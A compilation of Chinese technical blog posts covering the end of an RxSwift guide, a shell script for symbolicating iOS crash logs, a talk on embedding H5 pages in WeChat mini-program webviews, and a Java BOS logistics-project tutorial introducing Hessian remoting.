            }

            task.resume()

            return Disposables.create {
                task.cancel()
            }
        }
    }
}
Operator
RxSwift 实现了许多操作符。
所有操作符的的 marble diagram 可以在 ReactiveX.io 看到。
在 Playgrouds 里边几乎有所有操作符的演示。
如果你需要一个操作符，并且不知道如何找到它，这里有一个操作符的决策树。
Custom operators
有两种方式可以创建自定义的操作符。
Easy way
所有的内部代码都使用高度优化的运算符版本，因此它们不是最好的教程材料。这就是为什么我们非常鼓励使用标准运算符。
幸运的是，有一种简单的方法来创建操作符。创建新的操作符实际上就是创建可观察对象，前边的章节已经描述了如何做到这一点。
来看一下为优化的 map 操作符的实现：
extension ObservableType {
    func myMap<R>(transform: @escaping (E) -> R) -> Observable<R> {
        return Observable.create { observer in
            let subscription = self.subscribe { e in
                    switch e {
                    case .next(let value):
                        let result = transform(value)
                        observer.on(.next(result))
                    case .error(let error):
                        observer.on(.error(error))
                    case .completed:
                        observer.on(.completed)
                    }
                }

            return subscription
        }
    }
}

现在可以使用自定义的 map 了：
let subscription = myInterval(0.1)
    .myMap { e in
        return "This is simply \(e)"
    }
    .subscribe(onNext: { n in
        print(n)
    })

这将打印：
Subscribed
This is simply 0
This is simply 1
This is simply 2
This is simply 3
This is simply 4
This is simply 5
This is simply 6
This is simply 7
This is simply 8
...
Life happens
那么，如果用自定义运算符解决某些情况太难了呢？ 你可以退出 Rx monad，在命令性世界中执行操作，然后使用 Subjects 再次将结果隧道传输到Rx。
下边的例子是不应该被经常实践的，是糟糕的代码味道，但是你可以这么做。
let magicBeings: Observable<MagicBeing> = summonFromMiddleEarth()

magicBeings
  .subscribe(onNext: { being in     // exit the Rx monad
      self.doSomeStateMagic(being)
  })
  .disposed(by: disposeBag)

//
//  Mess
//
let kitten = globalParty(   // calculate something in messy world
  being,
  UIApplication.delegate.dataSomething.attendees
)
kittens.on(.next(kitten))   // send result back to rx

//
// Another mess
//
let kittens = BehaviorRelay(value: firstKitten) // again back in Rxmonad
kittens.asObservable()
  .map { kitten in
    return kitten.purr()
  }
  // ....
每一次你这样写的时候，其他人可能在其他地方写这样的代码：
kittens
  .subscribe(onNext: { kitten in
    // do something with kitten
  })
  .disposed(by: disposeBag)
所以，不要尝试这么做。
Error handling
有两种错误机制。
Asynchrouous error handling mechanism in observables
错误处理非常直接，如果一个序列以错误而终止，则所有依赖的序列都将以错误而终止。这是通常的短路逻辑。
你可以使用 catch 操作符从可观察对象的失败中恢复，有各种各样的可以让你详细指定恢复。
还有 retry 操作符，可以在序列出错的情况下重试。
KVO
KVO 是一个 Objective-C 的机制。这意味着他没有考虑类型安全，该项目试图解决这个问题的一部分。
有两种内置的方式支持 KVO：
// KVO
extension Reactive where Base: NSObject {
    public func observe<E>(type: E.Type, _ keyPath: String, options: KeyValueObservingOptions, retainSelf: Bool = true) -> Observable<E?> {}
}

#if !DISABLE_SWIZZLING
// KVO
extension Reactive where Base: NSObject {
    public func observeWeakly<E>(type: E.Type, _ keyPath: String, options: KeyValueObservingOptions) -> Observable<E?> {}
}
#endif
看一下观察 UIView 的 frame 的例子，注意 UIKit 并不遵从 KVO，但是这样可以
view
  .rx.observe(CGRect.self, "frame")
  .subscribe(onNext: { frame in
    ...
  })
或
view
  .rx.observeWeakly(CGRect.self, "frame")
  .subscribe(onNext: { frame in
    ...
  })
rx.observe
rx.observe 有更好的性能，因为它只是对 KVO 机制的包装，但是它使用场景有限。

它可用于观察从所有权图表中的self或祖先开始的 path（retainSelf = false）
它可用于观察从所有权图中的后代开始的 path（retainSelf = true）
path 必须只包含 strong 属性，否则你可能会因为在 dealloc 之前没有取消注册KVO观察者而导致系统崩溃。

例如：
self.rx.observe(CGRect.self, "view.frame", retainSelf: false)
rx.observeWeakly
rx.observeWeakly 比 rx.observe 慢一些，因为它必须在若引用的情况下处理对象释放。
它不仅适用于 rx.observe 适用的所有场景，还适用于：

因为它不会持有被观察的对象，所以它可以用来观察所有权关系位置的任意对象
它可以用来观察 weak 属性

Observing structs
KVO 是 Objective-C 的机制，所以它重度以来 NSValue 。
RxCocoa 内置支持 KVO 观察 CGRect、CGSize、CGPoint 结构体。
当观察其他结构体时，需要手动从 NSValue 中提前值。
这里有展示如何通过实现 KVORepresentable 协议，为其他的结构体扩展 KVO 观察和 *rx.observe**方法。
UI layer tips
在绑定到 UIKit 控件时，Observable 需要在 UI 层中满足某些要求。
Threading
Observable 需要在 MainScheduler 发送值，这只是普通的 UIKit/Cocoa 要求。
你的 API 最好在 MainScheduler 上返回结果。如果你试图从后台线程绑定一些东西到 UI，在 Debug build 中，RxCocoa 通常会抛出异常来通知你。
可以通过添加 observeOn(MainScheduler.instance) 来修复该问题。
Error
你无法将失败绑定到 UIKit 控件，因为这是为定义的行为。
如果你不知道 Observable 是否可以失败，你可以通过使用 catchErrorJustReturn(valueThatIsReturnedWhenErrorHappens) 来确保它不会失败，但是错误发生后，基础序列仍将完成。
如果所需行为是基础序列继续产生元素，则需要某些版本的 retry 操作符。
Sharing subscription
你通常希望在 UI 层中共享订阅，你不希望单独的 HTTP 调用将相同的数据绑定到多个 UI 元素。
假设你有这样的代码：
let searchResults = searchText
    .throttle(0.3, $.mainScheduler)
    .distinctUntilChanged
    .flatMapLatest { query in
        API.getSearchResults(query)
            .retry(3)
            .startWith([]) // clears results on new search term
            .catchErrorJustReturn([])
    }
    .share(replay: 1)    // <- notice the `share` operator
你通常想要的是在计算后共享搜索结果，这就是 share 的含义。
在 UI 层中，在转换链的末尾添加 share 通常是一个很好的经验法则。因为你想要共享计算结果，而不是把 searcResults 绑定到多个 UI 元素时，触发多个 HTTP 连接。
另外，请参阅 Driver，它旨在透明地包装这些 share 调用，确保在主 UI 县城上观察元素，并且不会将错误绑定到 UI。

原文为RxSwift/Getting Started，本文在原文基础上依自身需要略有修改。

********************************************************************************************************************************************************************************************************
脚本处理iOS的Crash日志
背景
当我们打包app时，可以选择生成对应的符号表，其保存 16 进制函数地址映射信息，通过给定的函数起始地址和偏移量，可以对应函数具体信息以供分析。
所以我们拿到测试给的闪退日志(.crash)时，需要找到打包时对应生成的符号表(.dSYM)作为钥匙解析。具体分为下面几个步骤

dwarfdump --uuid 命令获取 .dSYM 的 uuid
打开 .crash 文件，在特定位置找到 uuid
根据 arm 版本比对两者是否一致
到 Xcode 目录下寻找 symbolicatecrash 工具

不同版本文件路径不同，具体版本请谷歌。Xcode9路径是/Applications/Xcode.app/Contents/SharedFrameworks/DVTFoundation.framework/Versions/A/Resources/

设置终端环境变量
export DEVELOPER_DIR="/Applications/Xcode.app/Contents/Developer"
使用 symbolicatecrash 工具解析日志
symbolicatecrash .crash .dsym > a.out

虽然过程不复杂，但是每次都需要手动执行一次检查与命令，过于繁琐，所以决定用脚本化提高效率。
___
步骤实现
输入Crash日志
#要求输入crash文件路径
inputFile 'Please Input Crash File' 'crash'
crashPath=$filePath
由于需要输入两种不同后缀的文件路径，且都需要检查，因此统一定义一个方法。
#定义全局变量
filePath=
#输入文件路径
inputFile() {
    readSuccess=false
    #首先清空变量值
    filePath=
    while [ $readSuccess = false ]; do 
        echo $1
        #读取到变量中
        read -a filePath
        if [[ ! -e $filePath || ${filePath##*.} != $2 ]]; then
            echo "Input file is not ."$2
        else
            readSuccess=true
        fi
    done
}
.dSYM 是文件夹路径，所以这里简单的判断了路径是否存在，如果不存在就继续让用户输入。

Shell命令中判断分为[]与[[]]，后者比前者更通用，可以使用 || 正则运算等。
判断中，-f表示检查是否存在该文件，-d表示检查是否存在文件夹，-e表示检查是否存在该路径

输入dSYM符号表
dsymSuccess=false
while [ $dsymSuccess = false ]; do
    #要求输入dSYM文件路径
    inputFile 'Please Input dSYM File' 'dSYM'
    dsymPath=$filePath
    #检查是否匹配
    checkUUID "$crashPath" "$dsymPath"
    match=$?
    if [ $match -eq 0 ]; then
        echo 'UUID not match!'
    else
        dsymSuccess=true
    fi
done
循环获取匹配 UUID 的 dSYM ，这里使用了另一种方法获取方法返回值，具体之后章节会总结。
查找symbolicatecrash工具
在 Xcode 文件夹指定路径下查找工具，加快效率，如果没找到就停止运行。
# 查找symbolicatecrash解析工具，内置在Xcode的库文件中
toolPath=`find /Applications/Xcode.app/Contents/SharedFrameworks -name symbolicatecrash | head -n 1`
if [ ! -f $toolPath ]; then
    echo "Symbolicatecrash not exist!"
    exit 0
fi
执行解析命令
#先设置环境变量
export DEVELOPER_DIR="/Applications/Xcode.app/Contents/Developer"
#指定解析结果路径
crashName=`basename $crashPath`
afterPath="$(dirname "$crashPath")"/"${crashName%%.*}""_after.crash"
#开始解析
$toolPath "$crashPath" "$dsymPath" > "$afterPath" 2> /dev/null 
这里我将错误信息导流到 /dev/null，保证解析文件没有杂乱信息。

遇到的问题
怎么获取函数返回值？
之前没有处理过需要返回数值的方法，所以一开始有点懵，查询资料后最终采用了两种方式实现了效果，现在做一些总结。
全局变量记录
#定义全局变量
filePath=
inputFile() {
    #读取到变量中
    read -a filePath
}
inputFile
crashPath=$filePath
通过 inputFile 方法来了解一下，首先定义一个全局变量为 filePath，在方法中重新赋值，方法结束后读取全局变量中的数据。
这种方法的好处是可以自定义返回参数类型和个数，缺点是容易和其他变量搞混。
Return返回值
类似与C语言中的用法，脚本也支持 retrun 0 返回结果并停止运行。
checkUUID() {
    grep "$arm64id" "$1"
    if [ $? -ne 0 ]; then
        return 1;
    fi
    return 0;
}
checkUUID "$crashPath" "$dsymPath"
match=$?
获取结果的方式为 $?，其能够返回环境中最后一个指令结果，也就是之前执行的checkUUID的结果。
优点是简洁明了，符合编码习惯，缺点是返回值只能是 0-255 的数字，不能返回其他类型的数据。
获取打印值
还有一种方法其实平时一直在使用，只不过并不了解其运行方式。
crashName=`basename $crashPath`

print() {
    echo "Hello World"
}
text=$(print)
运行系统预设的方法或者自定义方法，将执行命令用 $() 的方式使用，就可以获取该命令中所有打印的信息，赋值到变量就可以拿到需要的返回值。
优点是功能全效率高，使用字符串的方式可以传递定制化信息，缺点是不可预期返回结果，需要通过字符串查找等命令辅助。
循环输入合法路径
在我的设想中，需要用户输入匹配的 dSYM 文件路径，如果不匹配，则重新输入，直到合法。为了支持嵌套，需要定义局部变量控制循环，具体代码如下
dsymSuccess=false
while [ $dsymSuccess = false ]; do
    #要求输入dSYM文件路径
    inputFile 'Please Input dSYM File' 'dSYM'
    dsymPath=$filePath
    #检查是否匹配
    checkUUID "$crashPath" "$dsymPath"
    match=$?
    if [ $match -eq 0 ]; then
        echo 'UUID not match!'
    else
        dsymSuccess=true
    fi
done
### 处理字符串
获取到 UUID 所有输出信息后，需要截取出对应平台的信息，处理还是不太熟悉，特地整理如下
#原始信息
UUID: 92E495AA-C2D4-3E9F-A759-A50AAEF446CD (armv7) /Volumes/.dSYM/Contents/Resources/DWARF/app
UUID: 536527A8-0243-34DB-AE08-F1F64ACA4351 (arm64) /Volumes/.dSYM/Contents/Resources/DWARF/app

#去除中间间隔-
uuid=${uuid//-/}

#从后往前找第一个匹配 \(arm64的，并且都删除
arm64id=${uuid% \(arm64*}
#处理后
UUID: 92E495AAC2D43E9FA759A50AAEF446CD (armv7) /Volumes/.dSYM/Contents/Resources/DWARF/app
UUID: 536527A8024334DBAE08F1F64ACA4351

#从前往后找最后一个UUID: ，并删除
arm64id=${arm64id##*UUID: }
#处理后 
536527A8024334DBAE08F1F64ACA4351

总结
看似简单的脚本，也花了一天时间编写，总体还是不太熟练，仍需努力联系。
这次特地尝试了与上次不同的参数输入方法，使用提示输入的方式，果然遇到了新的问题。好在都查资料解决了，结果还算满意。
脚本我提交到了Github，欢迎大家指教共同进步！给个关注最好啦～

********************************************************************************************************************************************************************************************************
小程序webview实践
小程序webview实践 -- 张所勇

大家好，我是转转开放业务部前端负责人张所勇，今天主要来跟大家分享小程序webview方面的问题，但我并不会讲小程序的webview原理，而我主要想讲的是小程序内如何嵌入H5。
那么好多同学会想了，不就是用web-view组件就可以嵌入了吗，是的，如果咱们的小程序和H5的业务比较简单，那直接用webview接入就好了，但我们公司的h5除小程序之外，还运行在转转app、58app、赶集app等多个端，如何能实现一套代码在多端运行，这是我今天主要想分享的，因此今天分享更适合h5页面比较复杂，存在多端运行情况的开发者，期待能给大家提供一些多端兼容的思路。

下面我先跟大家介绍下今天演讲主要的提纲。

小程序技术演进
webview VS 小程序
h5多端兼容方案
小程序sdk设计
webview常见问题

1 转转小程序演进过程

相信在座的很多同学的产品跟转转小程序经历了类似的发展过程，我们转转小程序是从去年五月份开始开发的，那时候也是小程序刚出来不久，我们就快速用原生语法搭建了个demo，功能很简单，就是首页列表页详情页。
然后我们从7月份开始进入了第二个阶段，这时候各种中大型公司已经意识到了，借助微信的庞大用户群，小程序是一个很好的获客渠道，因此我们也从demo阶段正式的开始了小程序开发。

那时候我们整个团队从北京跑到广州的微信园区里面去封闭开发，我们一方面在做小程序版本的转转，实现了交易核心流程，苦苦的做了两三个月，DAU始终也涨不上去，另一方面我们也在做很多营销活动的尝试，我们做了一款简单的测试类的小游戏，居然几天就刷屏了，上百万的pv，一方面我们很欣喜，另一方面也很尴尬，因为大家都是来玩的，不是来交易的，所以我们就开始了第三阶段。
这个阶段我们进行了大量的开发工作，让我们的小程序功能和体验接近了转转APP，那到了今年6月份，我们的小程序进入了微信钱包里面，我们的DAU峰值也达到了千万级别，这时候可以说已经成为了一个风口上的新平台，这个时候问题来了，公司的各条线业务都开始想接入到小程序里面。

于是乎就有了上面这段对话。
所以，为了能够更好接入各业务线存量h5页面和新的活动页，我们开始着手进行多端适配的工作。
那我们会考虑三种开发方案（我这里只说缺点）

在webview这个组件出来以前，我们是采用第一种方案，用纯小程序开发所有业务页面，那么适合的框架有现在主流的三种，wepy，mpvue、taro，缺点是不够灵活，开发成本巨大，真的很累，尤其是业务方来找我们想介入小程序，但他们的开发者又不会小程序，当时又不能嵌入H5，所以业务方都希望我们来开发，所有业务都来找，你们可以想想成本又多高，这个方案肯定是不可行，第二种方案，就是一套代码编译出多套页面，在不同端运行，mpvue和taro都可以，我们公司有业务团队在使用mpvue，编译出来的结果不是特别理性，一是性能上面没有达到理想的状态，二是api在多端兼容上面二次改造的成本很高，各个端api差异很大，如果是一个简单的活动页还好，但如果是一个跟端有很大功能交互的页面，那这种方式其实很难实现。
那我们采用的是第三种方案，目前我们的小程序是作为一个端存在，像app一样，我们只做首页、列表、详情、购买等等核心页面都是用小程序开发，每个业务的页面、活动运营页面都是H5，并且用webview嵌入，这样各个业务接入的成本非常低，但这也有缺点，1是小程序与h5交互和通信比较麻烦，二是我们的app提供了很大功能支持，这些功能在小程序里面都需要对应的实现
2 webview VS 小程序

这张图是我个人的理解。（并不代表微信官方的看法）
把webview和小程序在多个方面做了比对。
3 h5多端兼容方案

未来除了小程序之外，可能会多的端存在，比如智能小程序等等，那我们期望的结果是什么呢，就是一套H5能运行于各个环境内。

这可能是最差的一个case，h5判断所在的环境，去调用不同api方法，这个case的问题是，业务逻辑特别复杂，功能耦合非常严重，也基本上没有什么复用性。

那我们转转采取的是什么方案呢？
分三块，小程序端，用WePY框架，H5这块主要是vue和react，中间通过一个adapter来连接。我们转转的端特别多，除了小程序还包括纯转转app端，58端，赶集端，纯微信端，qq端，浏览器端，所以H5页面需要的各种功能，在每个端都需要对应的功能实现，比如登录、发布、支付、个人中心等等很多功能，这些功能都需要通过adapter这个中间件进行调用，接下来详细来讲。

我这里就不贴代码了，我只讲下adapter的原理，首先adapter需要初始化，做两件事情，一是产出一个供h5调用的native对象，二是需要检测当前所处的环境，然后根据环境去异步加载sdk文件，这里的关键点是我们要做个api调用的队列，因为sdk加载时异步的过程，如果期间页面内发生了api调用，那肯定得不到正确的响应，因此你要做个调用队列，当sdk初始化完毕之后再处理这些调用，其实adapter原理很简单，如果你想实现多端适配，那么只需要根据所在的环境去加载不同的sdk就可以了。

做好adapter之后，你需要让每个h5的项目都引入adapter文件，并且在调用api的时候，都统一在native对象下面调用。
4 小程序sdk设计

我们总结小程序提供给H5的功能大体分为这四种，第一是基于小程序的五种跳转能力，比如关闭当前页面。

那我们看到小程序提供了这五种跳转方式。

第二是直接使用微信sdk提供的能力，比如扫码，这个比较简单。第三是h5打开小程序的某些页面，这个是最常用的，比如进入下单页等。

对应每个api，小程序这边都需要实现对应的页面功能，大家看这几个图，skipToChat就是进到我们的IM页面，下面依次是进入个人主页，订单详情页，下单页面，其实我们的小程序开发的主要工作也是去做这些基础功能页面，然后提供给H5，各个业务基本都是H5实现，接入到小程序里面来，我们只做一个平台。

这是进入个人主页方法的实现，其实就是进入了小程序profile这个页面。

第四就是h5与小程序直接的通信能力，这个比较集中体现在设置分享信息和登录这块。
4.1 设置分享

上面（adapter）做好了以后，在h5这块调用就一句话就可以了。

小程序和h5 之间的通信基本上常用两种方式，一个是postMessage，这个方法大家都知道，只有在三种情况才可以触发，后退、销毁和分享，但也有个问题，这个方法是基础库1.7.1才开始支持的，1.7.1以下就只能通过第二种方法来传递数据，也就是设置和检测webview组件的url变化，类似pc时代的iframe的通信方式。

sdk这块怎么做呢，定义一个share方法，首先需要检测下基础库版本，看是否支持postMessage，如果支持直接调用，如果不支持，把分享参数拼接到url当中，然后进行一次重载，所以说通过url传递数据有个缺点，就是页面可能需要刷新一次才能设置成功。

我们看下分享信息设置这块，小程序这端，首先通过bindmessage事件接收h5传回来的数据，然后在用户分享的时候onShareAppMessage判断有没有回传的数据，如果没有就到webviewurl当中取，否则就是用默认分享数据。

h5调分享这块，我们也做了一些优化，传统方式是要四步才能掉起分享面板，点页面里的某个按钮，然后给用户个提示层，用户再去点右上角的点点点，再点转发，才能拉起分享面板。

我们后来改成了这样，点分享按钮，把分享信息带到一个专门的小程序页面，这个页面里面放一个button，type=share，点一下就拉起来面板了，虽然是一个小小的改动，但能大幅提高分享成功率的，因为很多用户对右上角的点点点不太敏感。
4.2 登录
接下来我们看看登录功能

分两种情况，接入的H5可能一开始就需要登录态，也可能开始不需要登录态中途需要登录，这两种情况我们约定了h5通过自己的url上一个参数进行控制。

一开始就需要登录态的情况，那么在加载webview之前，首先进行授权登录，然后把登录信息拼接到url里面，再去来加载webview，在h5里面通过adapter来把登录信息提取出来并且存到cookie里，这样h5一进来就是有登陆态的。
一开始不需要登录态的情况，一进入小程序就直接通过webview加载h5，h5调用login方法的时候，把needLogin这个参数拼接到url中，然后利用api进行重载，就走了第一种情况进行授权登录了。

5 webview常见问题
5.1 区分环境
第一是你如何区分h5所在的环境是小程序里面的webview还是纯微信浏览器，为什么要区分呢，因为你的H5在不同环境需要不同的api，比如我们的业务，下单的时候，如果是小程序，那么我们需要进入小程序的下单页，如果是纯微信，我们之间进纯微信的下单页，这两种情况的api实现是不一样的，那么为什么难区分，大家可能知道，小程序的组件分为内置组件和原生组件，内置组件就是小程序定义的view、scroll-view这些基本的标签，原生组件就是像map啊这种，这其实是调用了微信的原生能力，webview也是一种类似原生的组件，为什么说是类似原生的组件，微信并没有为小程序专门做一套webview机制，而是直接用微信本身的浏览器，所以小程序webview和微信浏览器的内核都是一样的，包括UA头都是一模一样，cookie、storage本地存储数据都是互通的，都是一套，因此我们很难区分具体是在哪个环境。

还好微信提供了一个环境变量，但这个变量不是很准确，加载h5以后第一个页面可以及时拿到，但后续的页面都需要在微信的sdk加载完成以后才能拿到，因此建议大家在wx.ready或者是weixinjsbridgeready事件里面去判断，区别就在于前者需要加载jweixin.js才有，但这里有坑，坑在于h5的开发者可能并不知道你这个检测过程需要时间，是一个异步的过程，他们可能页面一加载就需要调用一些api，这时候就可能会出错，因此你一定要提供一个api调用的队列和等待机制。
5.2 支付
第二个常见问题是支付，因为小程序webview里面不支持直接掉起微信支付，所以基本上需要支付的时候，都需要来到小程序里面，支付完再回去。

上面做好了以后，在h5这块调用就一句话就可以了。

我们转转的业务分两种支付情况，一是有的业务h5有自己完善的交易体系，下单动作在h5里面就可以完成，他们只需要小程序付款，因此我们有一个精简的支付页，进来直接就拉起微信支付，还有一种情况是业务需要小程序提供完整的下单支付流程，那么久可以之间进入我们小程序的收银台来，图上就是sdk里面的基本逻辑，我们通过payOnly这个参数来决定进到哪个页面。

我们再看下小程序里面精简支付怎么实现的，就是onload之后之间调用api拉起微信支付，支付成功以后根据h5传回来的参数，如果是个小程序页面，那之间跳转过去，否则就刷新上一个webview页面，然后返回回去。
5.3 formId收集
第三个问题是formId，webview里面没有办法收集formId，这有什么影响呢，没有formId就没法发服务通知，没有服务通知，业务就没办法对新用户进行召回，这对业务来讲是一个很大的损失，目前其实我们也没有很好的方案收集。

我们目前主要通过两种方式收集，访问量比较大的这种webview落地页，我们会做一版小程序的页面或者做一个小程序的中转页，只要用户有任何触摸页面的操作，都可以收集到formid，另外一种就是h5进入小程序页面时候收集，比如支付，IM这些页面，但并不是每个用户都会进到这些页面的，用户可能一进来看不感兴趣，就直接退出了，因此这种方式存在很大的流失。
5.4 左上角返回
那怎么解决这种流失呢，我们加了一个左上角返回的功能，。

首先进入的是一个空白的中转页，然后进入h5页面，这样左上角就会出现返回按钮了，当用户按左上角的返回按钮时候，页面会被重载到小程序首页去，这个看似简单又微小的动作，对业务其实有很大的影响，我们看两个数字，经过我们的数据统计发现，左上角返回按钮点击率高达70%以上，因为这种落地页一般是被用户分享出来的，以前纯h5的时候只能通过左上角返回，所以在小程序里用户也习惯如此，第二个数字，重载到首页以后，后续页面访问率有10%以上，这两个数字对业务提升其实蛮大的。

其实现原理很简单，都是通过第二次触发onShow时进行处理。
以上就是我今天全部演讲的内容，谢谢大家！

这是我们“大转转FE”的公众号。里面发表了很多FE和小程序方向的原创文章。感兴趣的同学可以关注一下，如果有问题可以在文章底部留言，我们共同探讨。
同时也感谢掘金举办了这次大会，让我有机会同各位同仁进行交流。在未来的前端道路上，与大家共勉！

********************************************************************************************************************************************************************************************************
day53_BOS项目_05


今天内容安排：

1、添加定区
2、定区分页查询
3、hessian入门 --> 远程调用技术
4、基于hessian实现定区关联客户



1、添加定区
定区可以将取派员、分区、客户信息关联到一起。页面：WEB-INF/pages/base/decidedzone.jsp




第一步：使用下拉框展示取派员数据，需要修改combobox的URL地址，发送请求
    <tr>        <td>选择取派员</td>        <td>            <input class="easyui-combobox" name="staff.id"                  data-options="valueField:'id',textField:'name',                    url:'${pageContext.request.contextPath}/staffAction_listajax.action'" />          </td>    </tr>
浏览器效果截图：
第二步：在StaffAction中提供listajax()方法，查询没有作废的取派员，并返回json数据
    /**     * 查询没有作废的取派员，并返回json数据     * @return     * @throws IOException      */    public String listajax() throws IOException {        List<Staff> list = staffService.findListNoDelete();        String[] excludes = new String[] {"decidedzones"}; // 我们只需要Staff的id和name即可，其余的都不需要，本例中我们只排除关联的分区对象        this.writeList2Json(list, excludes);        return "none";    }
第三步：在StaffService中提供方法查询没有作废的取派员
    /**     * 查询没有作废的取派员，即查询条件：deltag值为“0”     */    public List<Staff> findListNoDelete() {        // 创建离线条件查询对象        DetachedCriteria detachedCriteria = DetachedCriteria.forClass(Staff.class);        // 向离线条件查询对象中封装条件        detachedCriteria.add(Restrictions.eq("deltag", "0"));        return staffDao.findByCriteria(detachedCriteria);    }
第四步：在IBaseDao中提供通用的条件查询方法IBaseDao.java
    // 条件查询（不带分页）    public List<T> findByCriteria(DetachedCriteria detachedCriteria);
BaseDaoImpl.java
    /**     * 通用条件查询（不带分页）     */    public List<T> findByCriteria(DetachedCriteria detachedCriteria) {        return this.getHibernateTemplate().findByCriteria(detachedCriteria);    }
浏览器效果截图：
第五步：使用数据表格datagrid展示未关联到定区的分区数据decidedzone.jsp
    <td valign="top">关联分区</td>    <td>        <table id="subareaGrid"  class="easyui-datagrid" border="false" style="width:300px;height:300px"                 data-options="url:'${pageContext.request.contextPath}/subareaAction_listajax.action',                fitColumns:true,singleSelect:false">            <thead>                  <tr>                      <th data-options="field:'id',width:30,checkbox:true">编号</th>                      <th data-options="field:'addresskey',width:150">关键字</th>                      <th data-options="field:'position',width:200,align:'right'">位置</th>                  </tr>              </thead>         </table>    </td>
浏览器效果截图：
第六步：在SubareaAction中提供listajax()方法，查询未关联到定区的分区数据，并返回json数据
    /**     * 查询未关联到定区的分区数据，并返回json数据     * @return     * @throws IOException      */    public String listajax() throws IOException {        List<Subarea> list = subareaService.findListNotAssociation();        String[] excludes = new String[] {"region", "decidedzone"}; // 本例中我们只排除关联的区域对象和定区对象        this.writeList2Json(list, excludes);        return "none";    }
Service层代码：
    /**     * 查询未关联到定区的分区数据，即查询条件：decidedzone值为“null”     */    public List<Subarea> findListNotAssociation() {        // 创建离线条件查询对象        DetachedCriteria detachedCriteria = DetachedCriteria.forClass(Subarea.class);        // 向离线条件查询对象中封装条件        // detachedCriteria.add(Restrictions.eq("decidedzone", "null")); // 基本类型的属性使用eq()和ne()        detachedCriteria.add(Restrictions.isNull("decidedzone")); // 引用类型的属性使用isNull()和isNotNull()        return subareaDao.findByCriteria(detachedCriteria);    }
浏览器效果截图：
第七步：为添加/修改定区窗口中的保存按钮绑定事件
    <!-- 添加/修改分区 -->    <div style="height:31px;overflow:hidden;" split="false" border="false" >        <div class="datagrid-toolbar">            <a id="save" icon="icon-save" href="#" class="easyui-linkbutton" plain="true" >保存</a>            <script type="text/javascript">                $(function() {                    $("#save").click(function() {                        var v = $("#addDecidedzoneForm").form("validate");                        if (v) {                            $("#addDecidedzoneForm").submit(); // 页面会刷新                            // $("#addDecidedzoneForm").form("submit"); // 页面不会刷新                        }                    });                });            </script>        </div>    </div>
第八步：提交上面的添加定区的表单，发现id名称冲突浏览器截图：




代码截图：即：关联分区中的复选框的field的名称叫id，定区编码的name名称也叫id，造成冲突，服务器不能够区分开他们哪个id是定区，还是哪个id是分区，如何解决呢？答：我们应该类比于选择取派员的name的名称staff.id这样，如上图绿色框框中的那样，即我们可以把关联分区中的复选框的field的名称改为subareaid。即：我们要在Subarea类中提供getSubareaid()方法，就相当于给Subarea类中的字段id重新起个名字，这样返回的json数据中就含有subareaid字段了。Subarea.java改过之后，浏览器截图：第十步：创建定区管理的Action，提供add()方法保存定区，提供subareaid数组属性接收多个分区的subareaid
package com.itheima.bos.web.action;import org.springframework.context.annotation.Scope;import org.springframework.stereotype.Controller;import com.itheima.bos.domain.Decidedzone;import com.itheima.bos.web.action.base.BaseAction;/** * 定区设置 * @author Bruce * */@Controller@Scope("prototype")public class DecidedzoneAction extends BaseAction<Decidedzone> {    // 采用属性驱动的方式，接收页面提交过来的参数subareaid（多个，需要用到数组进行接收）    private String[] subareaid;    public void setSubareaid(String[] subareaid) {        this.subareaid = subareaid;    }    /**     * 添加定区     * @return     */    public String add() {        decidedzoneService.save(model, subareaid);        return "list";    }}
Service层代码：
package com.itheima.bos.service.impl;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Service;import org.springframework.transaction.annotation.Transactional;import com.itheima.bos.dao.IDecidedzoneDao;import com.itheima.bos.dao.ISubareaDao;import com.itheima.bos.domain.Decidedzone;import com.itheima.bos.domain.Subarea;import com.itheima.bos.service.IDecidedzoneService;@Service@Transactionalpublic class DecidedzoneServiceImpl implements IDecidedzoneService {    // 注入dao    @Autowired    private IDecidedzoneDao decidedzoneDao;    // 注入dao    @Autowired    private ISubareaDao subareaDao;    /**     * 添加定区     */    public void save(Decidedzone model, String[] subareaid) {        // 先保存定区表        decidedzoneDao.save(model);        // 再修改分区表的外键，java代码如何体现呢？答：让这两个对象关联下即可。谁关联谁都行。        // 但是在关联之前，我们应该有意识去检查下通过反转引擎自动生成出来的Hibernate配置文件中，谁放弃了维护外键的能力。        // 一般而言：是“一”的一方放弃。所以需要由“多”的一方来维护外键关系。        for (String sid : subareaid) {            // 根据分区id把分区对象查询出来，再让分区对象去关联定区对象model            Subarea subarea = subareaDao.findById(sid); // 持久化对象            // 分区对象 关联 定区对象 --> 多方关联一方            subarea.setDecidedzone(model); // 关联完之后，会自动更新数据库，根据快照去对比，看看我们取出来的持久化对象是否跟快照长得不一样，若不一样，就刷新缓存。            // 从效率的角度讲：我们应该拼接一个HQL语句去更新Subarea，而不是去使用Hibernate框架通过关联的方式更新            // HQL：update Subarea set decidedzone=? where id=? -->            // SQL：update bc_subarea set decidedzone_id=? where id=?        }    }}
第十一步：配置struts.xml
    <!-- 定区管理：配置decidedzoneAction-->    <action name="decidedzoneAction_*" class="decidedzoneAction" method="{1}">        <result name="list">/WEB-INF/pages/base/decidedzone.jsp</result>    </action>
2、定区分页查询
第一步：decidedzone.jsp页面修改datagrid的URL
    // 定区标准数据表格    $('#grid').datagrid( {        iconCls : 'icon-forward',        fit : true,        border : true,        rownumbers : true,        striped : true,        pageList: [30,50,100],        pagination : true,        toolbar : toolbar,        url : "${pageContext.request.contextPath}/decidedzoneAction_pageQuery.action",        idField : 'id',        columns : columns,        onDblClickRow : doDblClickRow    });
第二步：在DecidedzoneAction中提供分页查询方法
    /**     * 分页查询     * @return     * @throws IOException      */    public String pageQuery() throws IOException {        decidedzoneService.pageQuery(pageBean);        String[] excludes = new String[] {"currentPage", "pageSize", "detachedCriteria", "subareas", "decidedzones"};        this.writePageBean2Json(pageBean, excludes);        return "none";    }
第三步：修改Decidedzone.hbm.xml文件，取消懒加载

3、hessian入门 --> 远程调用技术


Hessian是一个轻量级的 remoting on http 工具，使用简单的方法提供了RMI(Remote Method Invocation 远程方法调用)的功能。相比WebService，Hessian更简单、快捷。采用的是二进制RPC协议(Remote Procedure Call Protocol 远程过程调用协议)，因为采用的是二进制协议，所以它很适合于发送二进制数据。


常见的远程调用的技术：

1、webservice（CXF框架、axis框架），偏传统，基于soap（简单对象访问协议）协议，传输的是xml格式的数据，数据冗余比较大，传输效率低。现在也支持json。
2、httpclient --> 电商项目：淘淘商城，大量使用
3、hessian --> http协议、传输的是二进制数据，冗余较少，传输效率较高。
4、dubbo --> 阿里巴巴



